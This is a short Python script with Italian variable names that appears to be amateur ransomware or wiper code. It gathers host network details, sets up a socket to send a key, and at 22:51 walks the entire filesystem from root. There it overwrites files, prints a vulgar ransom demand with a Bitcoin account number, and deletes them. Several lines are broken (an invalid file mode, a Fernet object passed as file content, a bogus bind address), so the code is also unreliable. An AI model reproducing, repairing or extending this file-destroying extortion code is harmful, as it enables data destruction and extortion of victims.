from datetime import datetime
import time
import socket
import os 
import socket
import subprocess
import shutil
"""import pyautogui
from  scapy.config import conf"""
#from wifi import Cell, Schermo
nomep=socket.gethostname()
comprleto=socket.gethostbyname(nomep)
print(comprleto)
from cryptography.fernet import Fernet
chiave=Fernet.generate_key()
#subprocess.Popen("notepad.exe")
test="FEfefe"
def dati_set():
    nomep=socket.gethostname()
    comprleto=socket.gethostbyname(nomep)
    tutto=socket.gethostbyaddr(nomep)
    print(comprleto)
    print(nomep)
    print(tutto)
    file=open("dati.txt","w")
    file.write(str(tutto))
    
    file.write(str(comprleto))
def invia_key():
    io=socket.socket()
    io.bind(("12.0.0.1",8900))
    try:
        print(f"print server in attersa {io}")
        caccca,possa=io.accept()
        print(f"sei conesso a {possa}")
        dati=caccca.recv(1024)
        caccca.send(dati)
        print(f"all aprossiama")
    except NameError as name:
        print(f"errore{name}")
while True:
    orariopc=datetime.now().strftime("%H/%M")
    print(f"orario {orariopc}")
    if orariopc =="22/51":
        for rooty,cart,files in os.walk("/"):
            for file in files:
                tuttifile=os.path.join(rooty, file)
                with open(tuttifile,"wr") as file:
                    file.writelines(Fernet(chiave))
                print("consegna tua madre nel conto btc:347654375")
                try:
                    os.remove(tuttifile)  
                except :
                    print(f"file eliminati {tuttifile}")

